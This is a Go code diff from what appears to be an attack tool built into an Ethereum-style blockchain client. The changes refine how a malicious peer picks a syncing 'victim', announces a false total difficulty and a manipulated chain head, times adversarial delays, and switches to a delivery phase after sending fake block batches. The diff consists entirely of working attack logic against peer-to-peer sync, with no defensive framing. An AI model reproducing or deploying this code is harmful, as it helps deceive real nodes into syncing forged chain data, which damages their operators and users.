@@ -177,13 +177,15 @@ func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
 	// Don't pick another malicious peer as a victim!
 	for _, s := range otherMaliciousPeers {
 		if vID == s {
+			log("Ignoring victim", vID, "because is a malicious peer")
 			return
 		}
 	}
 
 	// Victim must have to sync yet
 	predictionTD := getTd(utils.PredictionChain)
-	if td.Cmp(predictionTD) > 0 {
+	if victimID == "" && td.Cmp(predictionTD) > 0 {
+		log("Ignoring victim", vID, "because it is already syncing/synced")
 		return
 	}
 
@@ -223,6 +225,7 @@ func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
 			go rollbackChecker()
 
 			steppingDone = true
+			log("Set steppingDone =", steppingDone)
 		}
 
 		log("Set victim:", vID)
@@ -273,14 +276,6 @@ func PeerDropped() {
 */
 
 func NewPeerJoined(peer *p2p.Peer) {
-	// We don't need the victim's peer object during prediction phase
-	if attackPhase != utils.SyncPhase {
-		return
-	}
-
-	if peer.ID().String()[:8] == victimID {
-		victim = peer
-	}
 	return
 }
 
@@ -559,31 +554,33 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, *common.Hash,
 
 		if (attackPhase == utils.PredictionPhase && lastOracleBit) ||
 		   (attackPhase == utils.SyncPhase && !terminatingStateSync) {
-				if announcedSyncTD == nil {
-					diff := latest(utils.TrueChain).Difficulty
-					supplement := new(big.Int).Mul(diff, utils.BlockSupplement)
-					td := new(big.Int).Add(getTd(utils.TrueChain), supplement)
-					log("True TD in database (+suppl.):", td)
-					var head common.Hash
-					if fixedHead == 0 {
-						head = latest(utils.TrueChain).Hash()
-					} else {
-						head = getHeaderByNumber(utils.TrueChain, fixedHead).Hash()
+				diff := latest(utils.TrueChain).Difficulty
+				supplement := big.NewInt(int64(utils.BlockSupplement))
+				supplement.Mul(supplement, diff)
+				log("Using supplement:", supplement)
+				td := new(big.Int).Add(getTd(utils.TrueChain), supplement)
+				log("True TD in database (+suppl.):", td)
+				var head common.Hash
+				if targetHead != 0 {
+					headNumber := targetHead - targetHead%utils.BatchSize - 40
+					for getHeaderByNumber(utils.TrueChain, headNumber) == nil {
+						headNumber -= 64
 					}
-					announcedSyncHead = head
-					announcedSyncTD = td
-					content := make([]byte, 0)
-					content = append(content, announcedSyncHead.Bytes()...)
-					content = append(content, announcedSyncTD.Bytes()...)
-					err := sendMessage(msg.AnnouncedSyncTd.SetContent(content))
-					if err != nil {
-						fatal(err, "Could not notify announcedSyncTd")
-					}
-					return td, mustCheatAboutTd, &head, nil
+					head = getHeaderByNumber(utils.TrueChain, headNumber).Hash()
+					log("Manipulating announced head for pivot alignment")
 				} else {
-					td := new(big.Int).Sub(announcedSyncTD, bigOne)
-					return td, mustCheatAboutTd, &announcedSyncHead, nil
+					head = latest(utils.TrueChain).Hash()
 				}
+				announcedSyncHead = head
+				announcedSyncTD = td
+				content := make([]byte, 0)
+				content = append(content, announcedSyncHead.Bytes()...)
+				content = append(content, announcedSyncTD.Bytes()...)
+				err := sendMessage(msg.AnnouncedSyncTd.SetContent(content))
+				if err != nil {
+					fatal(err, "Could not notify announcedSyncTd")
+				}
+				return td, mustCheatAboutTd, &head, nil
 		}
 
 		if (attackPhase==utils.SyncPhase && terminatingStateSync) || attackPhase == utils.DeliveryPhase {
@@ -756,7 +753,7 @@ func MiniDelayBeforeServingBatch() {
 }
 
 func SkeletonAndPivotingDelay() {
-	time.Sleep(938*time.Millisecond)
+	time.Sleep(time.Duration(utils.AdversarialSyncDelay)*time.Millisecond)
 }
 
 func WaitBeforePivoting() {
@@ -870,7 +867,7 @@ func stopMovingChecker() {
 			if fixedHead == 0 {
 				fixedHead = targetHead
 				log("Fixed head for sync phase,", "number =", fixedHead)
-				headRlp, err := rlp.EncodeToBytes(head)
+				headRlp, err := rlp.EncodeToBytes(getHeaderByNumber(utils.TrueChain, fixedHead))
 				if err != nil {
 					fatal(err, "Couldn't RLP-encode header")
 				}
@@ -929,11 +926,6 @@ func SetPivot(pivotNumber uint64) {
 	}
 	rootAtPivot = getHeaderByNumber(chainType, pivot).Root
 	log("Pivot set,", "pivot =", pivot, ", root =", rootAtPivot)
-
-	headNumber := pivot + 64
-	head := getHeaderByNumber(chainType, headNumber)
-
-
 
 	// Shouldn't be necessary, but keep it commented for later maybe -- uncommented!
 
@@ -1121,6 +1113,7 @@ func TerminatingStepping() {
 func EndOfStepping() {
 	steppingDone = true
 	master = false
+	avoidVictim = true
 }
 
 func Close() {
@@ -1209,7 +1202,8 @@ func handleMessages() {
 					log("Switched to", attackPhase, "phase")
 				}
 				*/
-				if attackPhase != utils.DeliveryPhase && !(DoingPrediction() && lastOracleBit) {
+				//if attackPhase != utils.DeliveryPhase && !DoingSync() {
+				if DoingPredictionOrReady() || DoingSync() && steppingDone {
 					avoidVictim = false
 					log("Setting avoidVictim = false")
 				}
@@ -1242,6 +1236,7 @@ func handleMessages() {
 				case 1:
 					avoidVictim = true
 				}
+				log("Set avoidVictim =", avoidVictim)
 			case msg.LastOracleBit.Code:
 				lastOracleBit = true
 				log("Last oracle bit set")
@@ -1351,6 +1346,14 @@ func handleMessages() {
 					allFakeBatchesReceived = true
 					fakeBatches <- nil
 					log("All fake batches received")
+					if attackPhase != utils.DeliveryPhase {
+						attackPhase = utils.DeliveryPhase
+						log("Switched to", attackPhase, "phase")
+						err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
+						if err != nil {
+							fatal(err, "Could not announce new phase to orchestrator")
+						}
+					}
 				} else {
 					log("Fake batch arrived")
 					numBlocks := binary.BigEndian.Uint32(message.Content[:4])
